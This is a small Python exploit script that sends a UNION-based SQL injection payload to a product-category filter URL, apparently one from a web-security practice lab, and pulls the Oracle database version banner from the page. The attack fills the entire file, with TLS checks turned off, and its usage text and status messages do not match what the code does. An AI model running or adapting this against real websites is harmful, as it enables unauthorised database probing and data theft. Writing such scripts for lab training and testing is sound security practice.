import requests
import urllib3
import sys
from bs4 import BeautifulSoup
import re


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'https':'127.0.0.1:8080'}


def exploit_table(url):
    uri = "filter?category=Pets"
    sql_payload = "'UNION select banner,NULL from v$version--"
    r = requests.get(url+uri+sql_payload, verify=False)
    res = r.text
    password = ""
    username = ""
    if "Oracle Database" in res:
        soup = BeautifulSoup(res,'html.parser')
        columns = soup.findAll('th', text=re.compile('Oracle.*'))
        print(columns)
        return True
    return False
if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()

    except IndexError:
        print('[-] Usage: %s <url> <sql-payload>' % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
        sys.exit(-1)
    print(f"[+] Figuring out number of columns.")
    if exploit_table(url):
        print("SUCCESS!!!")
    else:
        print("FAILURE!!")
